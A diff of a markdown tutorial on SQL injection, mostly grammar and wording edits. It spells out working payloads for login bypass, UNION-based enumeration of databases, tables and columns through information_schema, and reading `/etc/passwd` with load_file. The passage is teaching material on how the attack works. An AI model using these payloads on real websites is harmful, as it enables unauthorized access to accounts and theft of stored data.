@@ -544,29 +544,28 @@ This a what a query looks like to login to retrieve information about the user t
 
 `*` means all columns.
 
-To check if the website has this vulnerability try to put a single quote (`'`) in the inputs, 
-if you get an error this website is vulnerable.
+To check if the website has this vulnerability try to put `'` (single quote) or `"` (double quote) in the inputs, if you get an error this website is vulnerable.
 
-After that test, if the website executes queries. Type this in the password field to check.
+To test if the website executes queries type this in the password field:
 
 `123456' AND 1=1#`. If this is the right password and you managed to login there is a SQL vulnerability.
 
 `123456' AND 1=2#`. If this is the right password and you didn't login there is a SQL vulnerability as well.
 
-You can use this pattern in any input field. Type something acceptable, type `'`, put a query and a comment sign (`#`)
+You can use this pattern in any input field. Type something acceptable, type `'`, put a query and a comment sign (`#`).
 
 The `#` sign was used to comment everything after it, so the statement will run `1=1` and stop.
 Other signs like `--` and `%00` work too.
 
 In this case, if you want to login without knowing the password, in the password field you could type: `anything' OR 1=1#`. This way if any of the statements are true it's gonna login, the password is wrong so it's false but `1=1` is true so you will be logged in.
 
-You can login without even entering a password if type this in the username field: `admin'#`.
+You can login without even entering a password if you type this in the username field: `admin'#`.
 
 #### GET Method
 
 When the inputs are passed by GET Method they are sent in the URL like so: `https://page.com/login.php?username=hello&password=world`
 
-So the variable `username` has a value of `hello` and `password` has a value of `world`. These variables are going to be passed to the server and run a SQL query, so you can inject code in these variables too.
+So the variable `username` has a value of `hello` and `password` has a value of `world`. These variables are going to be passed to the server and run a SQL query, so you can inject code on them too.
 
 It is important to note that when the code is been injected into the browser it has to be encoded because the URL only works with encoded characters. Search for a URL Encode Decode to encode the signs that you pass to the URL.
 
@@ -587,6 +586,9 @@ After identifying how many columns the table has, the next step is to build a qu
 
 To be able to combine the result of `SELECT` statements use the operator `UNION`.
 
+When the `UNION` operator is been used all columns have to be filled up in the `SELECT` statement,
+so to retrieve information set the other to `null`.
+
 At the example above, let's suppose that the number of columns is 5. So to get the columns with `UNION` put this in the URL:
 
 `https://page.com/login.php?username=hello' UNION SELECT 1,2,3,4,5 %23&password=world`
@@ -595,14 +597,13 @@ Then try some MySQL functions in the column numbers:
 
 `https://page.com/login.php?username=hello' UNION SELECT 1,database(),user(),version(),5 %23&password=world`
 
-These function will retrieve the current database, user and version of the database.
+These function will retrieve the current database, user and version of the database respectively.
 
 #### Find Database Tables
 
-When the `UNION` operator is been used all columns have to be filled up in the `SELECT` statement,
-so to retrieve information set the other to `null`.
-
 The `information_schema` database is a default database created by MySQL and it contains information about all other databases.
+
+To get all the tables from that database perform:
 
 `https://page.com/login.php?username=hello' UNION SELECT null,table_name,null,null,null from information_schema.tables %23&password=world`
 
@@ -612,7 +613,7 @@ To get all the table names from a database perform:
 
 `https://page.com/login.php?username=hello' UNION SELECT null,table_name,null,null,null from information_schema.tables where table_schema='[database name]' %23&password=world`
 
-To get the columns a table from a database perform:
+To get the columns of a table from a database perform:
 
 `https://page.com/login.php?username=hello' UNION SELECT null,column_name,null,null,null from information_schema.columns where table_name='[table name]' %23&password=world`
 
@@ -622,7 +623,7 @@ To get content in the columns from a table from a database perform:
 
 #### Read and Write Files On The Server
 
-With these functions the database can read and write files on the server. To see the perform:
+With these functions the database can read and write files on the server. To see it perform:
 
 `https://page.com/login.php?username=hello' UNION SELECT null,load_file('/etc/passwd'),null,null,null %23&password=world`
 
